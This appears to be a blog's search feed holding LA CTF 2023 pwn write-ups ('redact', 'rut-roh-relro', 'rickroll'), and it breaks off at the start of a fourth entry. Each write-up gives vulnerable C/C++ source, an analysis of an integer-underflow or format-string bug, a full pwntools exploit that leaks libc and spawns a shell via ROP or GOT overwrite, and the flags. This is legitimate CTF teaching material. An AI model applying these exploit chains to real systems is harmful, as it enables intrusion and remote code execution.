<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>La CTF 2023 - redact (CPP, std::string)</title>
      <link href="/230216-lactf2023-redact/"/>
      <url>/230216-lactf2023-redact/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>I heard C was insecure so I wrote my flag redactor program in C++.<br><code>nc lac.tf 31281</code></p></blockquote><ul><li>[46 solves &#x2F; 476 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Enter some text: &quot;</span>;</span><br><span class="line">  std::string text;</span><br><span class="line">  <span class="keyword">if</span> (!std::<span class="built_in">getline</span>(std::cin, text)) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read text\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Enter a placeholder: &quot;</span>;</span><br><span class="line">  std::string placeholder;</span><br><span class="line">  <span class="keyword">if</span> (!std::<span class="built_in">getline</span>(std::cin, placeholder)) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read placeholder\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Enter the index of the stuff to redact: &quot;</span>;</span><br><span class="line">  <span class="type">int</span> index;</span><br><span class="line">  <span class="keyword">if</span> (!(std::cin &gt;&gt; index)) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read index\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; text.<span class="built_in">size</span>() - placeholder.<span class="built_in">size</span>()) &#123; <span class="comment">// [*]</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Invalid index\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::<span class="built_in">copy</span>(placeholder.<span class="built_in">begin</span>(), placeholder.<span class="built_in">end</span>(), text.<span class="built_in">begin</span>() + index); <span class="comment">// [**]</span></span><br><span class="line">  std::cout &lt;&lt; text &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Look at the <code>[*]</code>. The <code>text.size()</code> and <code>placeholder.size()</code> are <code>size_t</code>. It means <code>unsigned</code>. But <code>index</code> is just <code>int</code>.<br>If <code>text.size()</code> is 0 and <code>placeholder.size()</code> is 8, the result of <code>text.size() - placeholder.size()</code> is normally -8(When it is <code>signed</code>..). But it is not. Becuase of their type is <code>unsigned</code>, the result of that is very big int. </p><p>If <code>text</code> is stored in stack, it can cause the BOF at <code>[**]</code>. We can trigger this, but We need to know the how <code>std::string</code> is stored in memory.</p><p>Here is the structure of that <code>std::string</code> is stored in memory.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+00h: &lt;Data Pointer&gt; </span><br><span class="line">+08h: &lt;Data Size&gt;</span><br><span class="line">+10h: &lt;Data&gt;  </span><br><span class="line">+18h: &lt;Data&gt;</span><br></pre></td></tr></table></figure><p>When <code>Data Size</code> is over <code>0x10</code>, <code>Data Pointer</code> is placed in heap. This mean that normally is placed in stack. You can use this feacture for exploit.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>leak libc</li><li>use the one gadget</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./redact2&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31281</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./redact2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># === first main ===</span></span><br><span class="line"></span><br><span class="line">rop1 = ROP(e, badchars=<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop1.call(<span class="string">&quot;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc&quot;</span>, [e.symbols[<span class="string">&quot;_ZSt4cout&quot;</span>], e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]])</span><br><span class="line">rop1.raw(rop1.find_gadget([<span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">rop1.main()</span><br><span class="line"></span><br><span class="line">info(rop1.dump())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;text: &quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;placeholder: &quot;</span>, rop1.generatePadding(<span class="number">0</span>, <span class="number">72</span>) + rop1.chain())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;redact: &quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># === second main ===</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xc961a execve(&quot;/bin/sh&quot;, r12, r13)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="comment">#   [r13] == NULL || r13 == NULL</span></span><br><span class="line">rop2 = ROP(e, badchars=<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop2(r12=<span class="number">0</span>, r13=<span class="number">0</span>)</span><br><span class="line">rop2.raw(libc.address + <span class="number">0xc961a</span>) <span class="comment"># one gadget </span></span><br><span class="line"></span><br><span class="line">info(rop2.dump())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;placeholder: &quot;</span>, rop2.generatePadding(<span class="number">0</span>, <span class="number">72</span>) + rop2.chain())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;redact: &quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>I use the <code>ROP</code> function first time that pwntools have. It is comfortable than I thought.</p><p>If you want to understand leak process, you need to understand <code>C++ style print</code>.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/images/230216-lactf2023-redact/Screenshot 2023-02-15 at 21.44.35.png" width=700/><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;1_l0v3_c++_L2zuBdqJABGU&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/uclaacm/lactf-archive/blob/master/2023/pwn/redact/solve.py">https://github.com/uclaacm/lactf-archive/blob/master/2023/pwn/redact/solve.py</a></li><li><a href="https://docs.pwntools.com/en/stable/rop/rop.html">https://docs.pwntools.com/en/stable/rop/rop.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> integer underflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - rut-roh-relro (RELRO)</title>
      <link href="/230215-lactf2023-rut-roh-relro/"/>
      <url>/230215-lactf2023-rut-roh-relro/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>My friend keeps writing super insecure C programs but I’m too lazy to fix his code. I’m sure it’ll be fine as long as I use enough exploit mitigations, right?<br><code>nc lac.tf 31180</code></p></blockquote><ul><li>[70 solves &#x2F; 462 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>Full Relro!! NX and PIE are enabled.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What would you like to post?&quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">512</span>];</span><br><span class="line">    fgets(buf, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your latest post:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWhat would you like to post?\n&quot;</span>);</span><br><span class="line">    fgets(buf, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nYour free trial has expired. Bye!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You can find twice fsb.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>leak libc, stack, pie &#x2F; <code>ret2main</code> (Overwrite the ret in stack to <code>main</code>)</li><li>Overwrite the ret in stack to <code>system</code> &#x2F; Overwrite the <code>rdi</code> to ‘&#x2F;bin&#x2F;sh\x00’</li></ol><p>The <code>rdi</code> is in the writeable space. You know the libc address. Got the offset during debugging and overwrite it.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rut_roh_relro&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31134</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./rut_roh_relro&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc,stack,pie</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%71$p%68$p%63$p&#x27;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x23d0a</span></span><br><span class="line">info(<span class="string">&#x27;libc address &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">ret = stack - <span class="number">0xe8</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x1265</span></span><br><span class="line">info(<span class="string">&#x27;pie address &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># og = [0xc961a, 0xc961d, 0xc9620]</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">6</span>, &#123;ret : e.symbols[<span class="string">&#x27;main&#x27;</span>]&#125;)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">###### (2) ######</span></span><br><span class="line">ret = stack - <span class="number">0xe0</span></span><br><span class="line">rdi = libc.address + <span class="number">0x1d1990</span></span><br><span class="line">info(<span class="built_in">hex</span>(ret))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">6</span>, &#123;ret : libc.symbols[<span class="string">&#x27;system&#x27;</span>]&#125;)</span><br><span class="line">payload += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">6</span>, &#123;rdi : <span class="string">b&#x27;/bin/sh\x00&#x27;</span>&#125;)</span><br><span class="line">payload += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>I want to use the one gadget, but I can’t. :( I have no choice to do honestly. Run the <code>system(&#39;/bin/sh\x00&#39;)</code> :).</p><p>But Some people use that gadget.. good.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;maybe_ill_add_asan_for_good_measure&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> relro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - rickroll (FSB)</title>
      <link href="/230215-lactf2023-rickroll/"/>
      <url>/230215-lactf2023-rickroll/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>Make your own custom rickroll with my new rickroll program!<br><code>nc lac.tf 31135</code></p></blockquote><ul><li>[90 solves &#x2F; 449 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (main_called) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;nice try&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    main_called = <span class="number">1</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Lyrics: &quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    fgets(buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Never gonna give you up, never gonna let you down\nNever gonna run around and &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Never gonna make you cry, never gonna say goodbye\nNever gonna tell a lie and hurt you\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>소스코드가 간단하다. fsb가 터진다. 다만 익스할 때 주의해야 할 점은 main을 다시 실행시킬 때 <code>main_called</code>을 다시 0으로 세팅해줘야 한다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>main_called</code>을 0으로 세팅하고 <code>puts@got</code>를 <code>main</code>으로 overwrite -&gt; <code>main_called</code>만 0으로 세팅해준다면 이제 계속 main이 반복해서 실행됨</li><li>libc leak 및 <code>main_called</code>을 0으로 세팅 </li><li><code>main_called</code>을 0으로 세팅하고 <code>printf@got</code>을 <code>system</code>로 overwrie </li><li>‘&#x2F;bin&#x2F;sh\x00’을 입력</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rickroll&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31135</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./rickroll&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(1, 80):</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># offset 6</span></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += fmtstr_payload(<span class="number">6</span>, &#123;</span><br><span class="line">        e.sym[<span class="string">&#x27;main_called&#x27;</span>] : p8(<span class="number">0</span>),</span><br><span class="line">        e.got[<span class="string">&#x27;puts&#x27;</span>] : e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    i = <span class="number">11</span></span><br><span class="line">    info(<span class="built_in">hex</span>(i))</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span> </span><br><span class="line">    payload += <span class="string">b&#x27;%8$hhn__&#x27;</span> <span class="comment"># 6</span></span><br><span class="line">    payload += <span class="string">b&#x27;%11$p&#x27;</span> <span class="comment">#+ i.to_bytes(1, &#x27;big&#x27;) + b&#x27;$p&#x27;    # 7 16</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">16</span>-<span class="built_in">len</span>(payload)) <span class="comment"># padding</span></span><br><span class="line">    payload += p64(e.sym[<span class="string">&#x27;main_called&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x53d9b</span></span><br><span class="line">    info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += fmtstr_payload(<span class="number">6</span>, &#123;</span><br><span class="line">        e.sym[<span class="string">&#x27;main_called&#x27;</span>] : p8(<span class="number">0</span>),</span><br><span class="line">        e.got[<span class="string">&#x27;printf&#x27;</span>] : libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">    <span class="built_in">print</span>(ex)</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="comment"># p = process(&#x27;./rickroll&#x27;)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31135</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>도커파일이 제공되었음에도 로컬과 리모트 환경을 똑같이 맞춰주지 않고 로컬에서 먼저 쉘을 획득하고 리모트를 실행했. 당연히 실패했다. ㅋ 그래서 대충 브포로 leak 오프셋 맞춰주려고 했는데 잘 안되어서 그냥 patchelf 해줘서 문제를 풀었던 기억이 난다. </p><p>도커파일이 제공되면.. 환경부터 맞춰주는게 덜 귀찮은 것을 깨달았다.</p><p>그리고 <code>fmtstr_payload</code>은 동시에 여러개 덮을 수 있다는 점과 payload를 구성할 때 저 함수만 단독으로 써줘야하는 것을 깨달았다.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;printf_gave_me_up_and_let_me_down&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - bot</title>
      <link href="/230215-lactf2023-bot/"/>
      <url>/230215-lactf2023-bot/</url>
      
